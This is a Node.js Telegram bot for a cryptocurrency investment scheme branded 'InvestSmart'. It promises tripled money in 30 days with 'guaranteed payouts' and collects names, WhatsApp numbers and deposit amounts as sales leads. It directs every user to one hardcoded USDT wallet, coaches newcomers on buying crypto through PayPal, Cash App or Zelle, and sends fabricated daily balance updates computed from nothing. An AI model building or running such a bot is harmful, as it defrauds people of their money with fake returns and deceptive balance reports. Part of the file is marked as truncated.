const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");

// ─── CONFIG ────────────────────────────────────────────────────────────────
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const LEADS_CHANNEL = process.env.LEADS_CHANNEL || "@clientlead";

// ─── USDT WALLET ───────────────────────────────────────────────────────────
const USDT_WALLET  = "TRp4CmaVZJf5gN3QgqWViFfAS8751zn8DN";
const USDT_NETWORK = "TRC-20 (TRON)";

const bot = new TelegramBot(TOKEN, { polling: true });

// ─── INVESTOR DATABASE (saved to investors.json) ───────────────────────────
const DB_FILE = "./investors.json";
function loadDB() {
  try { return JSON.parse(fs.readFileSync(DB_FILE, "utf8")); } catch { return {}; }
}
function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

// ─── SESSION STORE ─────────────────────────────────────────────────────────
const sessions = {};
function getSession(chatId) {
  if (!sessions[chatId]) sessions[chatId] = { step: "idle", data: {} };
  return sessions[chatId];
}

// ─── INVESTMENT PLANS ──────────────────────────────────────────────────────
const PLANS = [
  { id: "starter", emoji: "🌱", name: "Starter Plan", invest: 100,   payout: 300,   days: 30, minDeposit: 100,   maxDeposit: 499        },
  { id: "silver",  emoji: "⚡", name: "Silver Plan",  invest: 500,   payout: 1500,  days: 30, minDeposit: 500,   maxDeposit: 1999       },
  { id: "gold",    emoji: "🏆", name: "Gold Plan",    invest: 2000,  payout: 6000,  days: 30, minDeposit: 2000,  maxDeposit: 9999       },
  { id: "vip",     emoji: "💎", name: "VIP Plan",     invest: 10000, payout: 30000, days: 30, minDeposit: 10000, maxDeposit: Infinity   },
];

function getPlan(amount) {
  return PLANS.find(p => amount >= p.minDeposit && amount <= p.maxDeposit) || PLANS[PLANS.length - 1];
}
function dailyProfit(plan, amount) {
  return ((plan.payout - plan.invest) / plan.invest) * amount / plan.days;
}
function fmt(n) {
  return "$" + Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function buildGrowthTable(amount) {
  const plan = getPlan(amount);
  const daily = dailyProfit(plan, amount);
  let table = "";
  for (const day of [1, 5, 10, 15, 20, 25, 30]) {
    table += `Day ${String(day).padStart(2)} │ +${fmt(daily * day).padStart(9)} │ 💰 ${fmt(amount + daily * day)}\n`;
  }
  return table;
}

// ─── POST LEAD TO CHANNEL ──────────────────────────────────────────────────
async function sendLeadToChannel(lead) {
  const amount = parseFloat(lead.rawAmount);
  const plan   = getPlan(amount);
  const daily  = dailyProfit(plan, amount);
  const payout = amount + daily * 30;

  const msg =
`🔔 *NEW INVESTOR LEAD*
━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${lead.name}
📱 *WhatsApp:* ${lead.phone}
💰 *Amount:* ${fmt(amount)} USDT
📋 *Plan:* ${plan.emoji} ${plan.name}
📈 *Daily Earnings:* +${fmt(daily)}/day
🏆 *30-Day Payout:* ${fmt(payout)}
⚡ *Readiness:* ${lead.readiness}
🆔 *Chat ID:* \`${lead.chatId}\`
━━━━━━━━━━━━━━━━━━━
🪙 *Wallet:* \`${USDT_WALLET}\`
🔗 *Network:* ${USDT_NETWORK}
📅 ${new Date().toUTCString()}`;

  try {
    await bot.sendMessage(LEADS_CHANNEL, msg, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Channel error:", err.message);
  }
}

// ─── DAILY UPDATE SENDER ───────────────────────────────────────────────────
async function sendDailyUpdates() {
  const db = loadDB();
  const now = Date.now();

  for (const [chatId, investor] of Object.entries(db)) {
    if (investor.status !== "active") continue;

    const daysPassed = Math.floor((now - investor.startDate) / (1000 * 60 * 60 * 24));
    if (daysPassed > 30) {
      // Plan complete
      await bot.sendMessage(chatId,
`🎉 *Congratulations, ${investor.name}!*

Your 30-day investment cycle is *complete!*

━━━━━━━━━━━━━━━━━━━
💵 You invested: *${fmt(investor.amount)}*
🏆 Your payout: *${fmt(investor.payout)}*
💸 Total profit: *+${fmt(investor.payout - investor.amount)}*
━━━━━━━━━━━━━━━━━━━

Your payout is being processed and will be sent to your wallet within 24 hours. 🚀

Would you like to reinvest and start a new cycle? Tap *🚀 Invest Now*!`,
      { parse_mode: "Markdown", ...MAIN_MENU });

      db[chatId].status = "completed";
      saveDB(db);
      continue;
    }

    if (daysPassed < 1) continue;

    const plan    = getPlan(investor.amount);
    const daily   = dailyProfit(plan, investor.amount);
    const balance = investor.amount + daily * daysPassed;
    const left    = 30 - daysPassed;

    await bot.sendMessage(chatId,
`📊 *Daily Balance Update*

👋 Hi ${investor.name}!

━━━━━━━━━━━━━━━━━━━
📅 Day *${daysPassed}* of 30
💰 Current Balance: *${fmt(balance)}*
📈 Today's Earnings: *+${fmt(daily)}*
⏳ Days Remaining: *${left} days*
🏆 Final Payout: *${fmt(investor.payout)}*
━━━━━━━━━━━━━━━━━━━
_Your money is growing every day! 🚀_`,
    { parse_mode: "Markdown" });
  }
}

// Run daily updates every 24 hours
setInterval(sendDailyUpdates, 24 * 60 * 60 * 1000);

// ─── MENUS ─────────────────────────────────────────────────────────────────
const MAIN_MENU = {
  reply_markup: {
    keyboard: [
      [{ text: "💼 Investment Plans" },    { text: "🧮 Calculate Returns"   }],
      [{ text: "📈 How It Works"      },   { text: "❓ FAQ"                 }],
      [{ text: "💳 How to Buy USDT"   },   { text: "🚀 Invest Now"          }],
    ],
    resize_keyboard: true,
  },
};
const BACK_MENU = {
  reply_markup: { keyboard: [[{ text: "⬅️ Back to Main Menu" }]], resize_keyboard: true },
};

// ─── CONTENT ───────────────────────────────────────────────────────────────
const HOW_IT_WORKS =
`📈 *How It Works*

*1️⃣ Pick a plan* — from $100 up to any amount
*2️⃣ Buy USDT* — using PayPal, Cash App, Zelle or any exchange
*3️⃣ Send payment* — to your assigned wallet (TRC-20)
*4️⃣ Plan activates* — within 1–2 hours of confirmation
*5️⃣ Daily updates* — your balance sent to you here every day
*6️⃣ Payout* — full amount sent to your wallet on Day 30

━━━━━━━━━━━━━━━━━━━
📊 *Example — Starter Plan:*
💵 You invest: *$100 USDT*
📈 Daily growth: *+$6.67/day*
• Day 10 → *$166.70*
• Day 20 → *$233.40*
• Day 30 → *$300.00* 🏆

✅ Daily balance updates
✅ No hidden fees
✅ 100% guaranteed payouts`;

const HOW_TO_BUY_USDT =
`💳 *How to Buy USDT*

New to crypto? No problem! Here's how to buy USDT using apps you already know:

━━━━━━━━━━━━━━━━━━━
*1️⃣ PayPal*
1. Open PayPal app → tap *Crypto* at the bottom
2. Select *USDT (Tether)*
3. Enter the amount you want to buy
4. Complete purchase with your PayPal balance or linked bank
5. To send: tap *Transfer* → *External Wallet* → paste our wallet address
⚠️ _Make sure to select TRC-20 network when withdrawing_

━━━━━━━━━━━━━━━━━━━
*2️⃣ Cash App*
1. Open Cash App → tap the *Bitcoin* tab (bottom menu)
2. Tap *Buy* — Cash App supports Bitcoin directly
3. To get USDT: first buy Bitcoin, then transfer to *Binance* or *Coinbase* and swap to USDT
4. Then withdraw USDT via TRC-20 to our wallet

💡 _Easier option: Use Cash App to fund a Coinbase or Binance account directly_

━━━━━━━━━━━━━━━━━━━
*3️⃣ Zelle*
Zelle doesn't sell crypto directly, but here's the easiest path:
1. Zelle money to your bank account
2. Open *Coinbase* or *Binance* (free to sign up)
3. Link your bank → deposit USD → buy USDT
4. Withdraw USDT via *TRC-20* to our wallet address

━━━━━━━━━━━━━━━━━━━
*4️⃣ Coinbase (Easiest overall)*
1. Download *Coinbase* app → sign up (takes 5 mins)
2. Link your bank, debit card, or PayPal
3. Search *USDT* → tap Buy → enter amount
4. Go to *Send* → paste our wallet address
5. Select *TRON (TRC-20)* as the network → confirm

━━━━━━━━━━━━━━━━━━━
*5️⃣ Binance*
1. Download *Binance* app → create account
2. Tap *Buy Crypto* → choose your payment method
3. Buy *USDT*
4. Go to *Wallet* → *Withdraw* → paste our wallet
5. Select *TRC20* network → enter amount → confirm

━━━━━━━━━━━━━━━━━━━
⚠️ *IMPORTANT — Always use TRC-20 network!*
When withdrawing to our wallet, always select:
*Network: TRC20 (TRON)*
< truncated lines 236-273 >
    msg += `• Payout: *${fmt(p.payout)} USDT* in 30 days\n`;
    msg += `• Profit: *+${fmt(p.payout - p.invest)}* 🚀\n\n`;
  }
  msg += `💡 _Any amount works — profits scale with your deposit._\n\nTap *🧮 Calculate Returns* to see your exact numbers!`;
  return msg;
};

// ─── LEAD FLOW ─────────────────────────────────────────────────────────────
const LEAD_STEPS = ["name", "phone", "amount", "readiness"];
const LEAD_PROMPTS = {
  name:      `🚀 *Let's Activate Your Plan!*\n\nWhat's your *full name*?`,
  phone:     `Thanks {name}! 📱\n\nWhat's your *WhatsApp number*?`,
  amount:    `💰 How much would you like to invest?\n\nType any amount — e.g. *100*, *500*, *2000*\n_Minimum: $100 USDT_`,
  readiness: `Almost done! ⚡\n\nHow soon can you send payment?\n\n1️⃣ Today!\n2️⃣ Within 24 hours\n3️⃣ This week\n4️⃣ Just checking for now\n\nReply *1, 2, 3 or 4*:`,
};
const READINESS_MAP = { 1: "Today 🔥", 2: "Within 24hrs ⚡", 3: "This week 📅", 4: "Just exploring 👀" };

// ─── BOT HANDLERS ──────────────────────────────────────────────────────────
bot.onText(/\/start/, (msg) => {
  const s = getSession(msg.chat.id);
  s.step = "idle"; s.data = {};
  bot.sendMessage(msg.chat.id,
`👋 *Welcome to InvestSmart!*

Grow your USDT into *3x returns in just 30 days* — with daily balance updates so you watch every dollar stack up.

💸 *Our Plans:*
🌱 $100 → *$300* in 30 days
⚡ $500 → *$1,500* in 30 days
🏆 $2,000 → *$6,000* in 30 days
💎 $10,000 → *$30,000* in 30 days

📈 Daily updates • USDT payments • Guaranteed payouts

*What would you like to do?* 👇`,
  { parse_mode: "Markdown", ...MAIN_MENU });
});

// Admin command: activate investor after payment confirmed
// Usage: /activate <chatId> <amount>
bot.onText(/\/activate (\d+) (\d+\.?\d*)/, async (msg, match) => {
  if (msg.chat.id.toString() !== msg.from.id.toString()) return;
  const targetChatId = match[1];
  const amount = parseFloat(match[2]);
  const plan   = getPlan(amount);
  const daily  = dailyProfit(plan, amount);
  const payout = amount + daily * 30;

  const db = loadDB();
  db[targetChatId] = {
    name: db[targetChatId]?.name || "Investor",
    chatId: targetChatId,
    amount, payout,
    planName: plan.name,
    startDate: Date.now(),
    status: "active",
  };
  saveDB(db);

  await bot.sendMessage(targetChatId,
`✅ *Payment Confirmed — Plan Activated!*

Welcome aboard, ${db[targetChatId].name}! 🎉

━━━━━━━━━━━━━━━━━━━
📋 Plan: ${plan.emoji} *${plan.name}*
💵 Invested: *${fmt(amount)} USDT*
📈 Daily earnings: *+${fmt(daily)}/day*
🏆 30-day payout: *${fmt(payout)} USDT*
━━━━━━━━━━━━━━━━━━━

Your balance is now growing every day! You'll receive a *daily update* right here in this chat starting tomorrow. 📊

Sit back and watch your money grow! 💰`,
  { parse_mode: "Markdown" });

  await bot.sendMessage(msg.chat.id, `✅ Investor ${targetChatId} activated for ${fmt(amount)}`);
});

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();
  if (!text || text.startsWith("/")) return;

  const s = getSession(chatId);

  // ── LEAD FLOW ──
  if (LEAD_STEPS.includes(s.step)) {
    const step = s.step;

    if (step === "readiness") {
      const val = parseInt(text);
      if (![1,2,3,4].includes(val))
        return bot.sendMessage(chatId, "Please reply *1, 2, 3, or 4* 👇", { parse_mode: "Markdown" });

      s.data.readiness = READINESS_MAP[val];
      s.data.chatId    = chatId;
      s.step = "idle";

      const amount = parseFloat(s.data.rawAmount);
      const plan   = getPlan(amount);
      const daily  = dailyProfit(plan, amount);
      const payout = amount + daily * 30;

      // Save name for later activation
      const db = loadDB();
      db[chatId] = { name: s.data.name, chatId, amount, payout, status: "pending" };
      saveDB(db);

      await sendLeadToChannel(s.data);

      return bot.sendMessage(chatId,
`✅ *You're Registered!*

Your payment wallet has been assigned:

\`${USDT_WALLET}\`

🔗 *Network: ${USDT_NETWORK}*
💵 *Send exactly: ${fmt(amount)} USDT*

━━━━━━━━━━━━━━━━━━━
📋 *Your Plan*
${plan.emoji} *${plan.name}*
• Daily earnings: *+${fmt(daily)}/day*
• 30-day payout: *${fmt(payout)} USDT*
━━━━━━━━━━━━━━━━━━━

*Next Steps:*
1️⃣ Buy USDT if you haven't yet (tap *💳 How to Buy USDT*)
2️⃣ Send *exactly ${fmt(amount)} USDT* using *TRC-20 network*
3️⃣ Screenshot your transfer & send to our team on WhatsApp
4️⃣ Your plan activates within *1–2 hours* ⚡

📞 Our team will also reach you on *${s.data.phone}* shortly.

Once active, you'll get *daily balance updates* right here! 📈`,
      { parse_mode: "Markdown", ...MAIN_MENU });
    }

    if (step === "amount") {
      const val = parseFloat(text.replace(/[$,]/g, ""));
      if (isNaN(val) || val < 100)
        return bot.sendMessage(chatId, "Minimum is *$100 USDT*. Please enter a valid amount:", { parse_mode: "Markdown" });

      s.data.rawAmount = val;
      s.data.amount    = fmt(val);
      s.step = "readiness";

      const plan  = getPlan(val);
      const daily = dailyProfit(plan, val);
      const payout = val + daily * 30;
      const table = buildGrowthTable(val);

      return bot.sendMessage(chatId,
`💰 *Your Investment Breakdown*

${plan.emoji} Plan: *${plan.name}*
💵 Deposit: *${fmt(val)} USDT*
📈 Daily earnings: *+${fmt(daily)}/day*
🏆 30-day payout: *${fmt(payout)} USDT*
💸 Profit: *+${fmt(payout - val)} USDT*

━━━━━━━━━━━━━━━━━━━
📅 *Daily Growth Preview*
\`\`\`
${table}\`\`\`
━━━━━━━━━━━━━━━━━━━
${LEAD_PROMPTS.readiness}`,
      { parse_mode: "Markdown", ...BACK_MENU });
    }

    s.data[step] = text;
    const next = LEAD_STEPS[LEAD_STEPS.indexOf(step) + 1];
    s.step = next;
    return bot.sendMessage(chatId,
      LEAD_PROMPTS[next].replace("{name}", s.data.name || ""),
      { parse_mode: "Markdown", ...BACK_MENU });
  }

  // ── CALCULATOR ──
  if (s.step === "calc") {
    const val = parseFloat(text.replace(/[$,]/g, ""));
    if (isNaN(val) || val < 1)
      return bot.sendMessage(chatId, "Please enter a valid amount e.g. *500*", { parse_mode: "Markdown" });

    s.step = "idle";
    const plan  = getPlan(val);
    const daily = dailyProfit(plan, val);
    const payout = val + daily * 30;

    let full = "";
    for (let d = 1; d <= 30; d++) {
      if (d <= 5 || d % 5 === 0)
        full += `Day ${String(d).padStart(2)} │ Earned: +${fmt(daily*d).padStart(9)} │ Balance: ${fmt(val + daily*d)}\n`;
    }

    return bot.sendMessage(chatId,
`🧮 *Your 30-Day Projection*

💵 Deposit: *${fmt(val)} USDT*
${plan.emoji} Plan: *${plan.name}*
📈 Daily: *+${fmt(daily)}/day*

━━━━━━━━━━━━━━━━━━━
\`\`\`
${full}\`\`\`
━━━━━━━━━━━━━━━━━━━
🏆 Payout: *${fmt(payout)} USDT*
💸 Profit: *+${fmt(payout - val)} USDT*
📊 Return: *${((payout/val-1)*100).toFixed(0)}% in 30 days* 🚀

Tap *🚀 Invest Now* to get started!`,
    { parse_mode: "Markdown", ...MAIN_MENU });
  }

  // ── MENU ROUTING ──
  if (text === "⬅️ Back to Main Menu") { s.step = "idle"; return bot.sendMessage(chatId, "What would you like to do?", MAIN_MENU); }
  if (text === "💼 Investment Plans")   return bot.sendMessage(chatId, PLANS_MSG(),   { parse_mode: "Markdown", ...BACK_MENU });
  if (text === "📈 How It Works")       return bot.sendMessage(chatId, HOW_IT_WORKS,  { parse_mode: "Markdown", ...BACK_MENU });
  if (text === "❓ FAQ")                return bot.sendMessage(chatId, FAQ_TEXT,       { parse_mode: "Markdown", ...BACK_MENU });
  if (text === "💳 How to Buy USDT")    return bot.sendMessage(chatId, HOW_TO_BUY_USDT, { parse_mode: "Markdown", ...BACK_MENU });
  if (text === "🧮 Calculate Returns") {
    s.step = "calc"; s.data = {};
    return bot.sendMessage(chatId, `🧮 *Returns Calculator*\n\nHow much are you thinking of investing?\n\nType any amount — e.g. *100*, *500*, *2000*`, { parse_mode: "Markdown", ...BACK_MENU });
  }
  if (text === "🚀 Invest Now") {
    s.step = "name"; s.data = {};
    return bot.sendMessage(chatId, LEAD_PROMPTS.name, { parse_mode: "Markdown", ...BACK_MENU });
  }

  bot.sendMessage(chatId, "Use the menu below 👇", MAIN_MENU);
});

console.log("🤖 InvestSmart Bot is running...");
